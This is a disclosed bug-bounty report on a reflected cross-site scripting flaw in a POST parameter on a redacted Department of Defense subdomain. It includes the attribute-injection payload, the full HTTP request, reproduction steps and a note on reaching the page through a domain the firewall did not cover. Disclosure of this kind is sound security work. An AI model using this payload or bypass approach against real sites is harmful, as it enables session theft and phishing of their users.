# [XSS] Reflected XSS via POST request

## Report Details
- **Report ID**: 1850235
- **URL**: https://hackerone.com/reports/1850235
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-01-29T09:11:28.377Z
- **Disclosed**: 2023-02-24T19:05:12.588Z

## Reporter
- **Username**: 0xd3adc0de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**
XSS vulnerability found on one of `█████████` subdomains. [ DoD scope]

After analyzing `https://██████████/` I found `██████/████████-historic.cfm` page that send some parameters to servers.  `fld_displaytype` parameter vulnerable to XSS vulnerability.

`fld_displaytype=S` changed to `fld_displaytype=S"%20accesskey%3d"X"%20onclick%3d"alert('XSS Success!')`

WAF deployed on the endpoint to prevent such a attacks but I found another domain linked to this host but WAF did not cover that so I success to fire the payload.

By sending the POST request to `https://█████████████████/` , payload has been successfully triggered. 

```
POST /██████/███████-historic.cfm HTTP/1.1
Host: █████████
Cookie: CFID=29878711; CFTOKEN=71972184
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 347
Origin: null
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

fld_graphfs=Y&fld_graphrs=N&fld_graphy1=N&fld_graphy2=N&fld_normal=Y&fld_max=Y&fld_min=Y&Submit=View-Graph&fld_from1=01%2F01%2F2023&fld_to1=12%2F31%2F2023&fld_displaytype=S"%20accesskey%3d"X"%20onclick%3d"alert('XSS Success!')&fld_type1=Plot&fld_frompor=&fld_topor=&fld_year1=2023&fld_year2=2023&fld_mon1=01&fld_day1=01&fld_mon2=12&fld_day2=31&fld_param=HT

```


- **WAF enabled** https://████████████/

██████████
- **WAF disabled** https://███████████████/

███


**Summary:**
Trigger a hidden stored XSS payload requires user interaction*.
user should press ALT+SHIFT+X to call hidden payload.

## References
https://owasp.org/www-community/attacks/xss/

## Impact

By exploiting this vulnerability an attacker can trick the users to execute XSS and steal user's cookies.
Launch advanced phishing attacks.
Execute browser-based attacks etc.

## System Host(s)
████████████, ████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
**Firefox**

* Visit the following URL using Firefox
`https://████████████/██████/█████████-historic.cfm`

* Intercept the request before click on `View-Graph`

* Change `fld_displaytype=S` to `fld_displaytype=S"%20accesskey%3d"X"%20onclick%3d"alert('XSS Success!')` in request body.

* press ALT+SHIT+X and you will receive `XSS Success!` alert box.

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
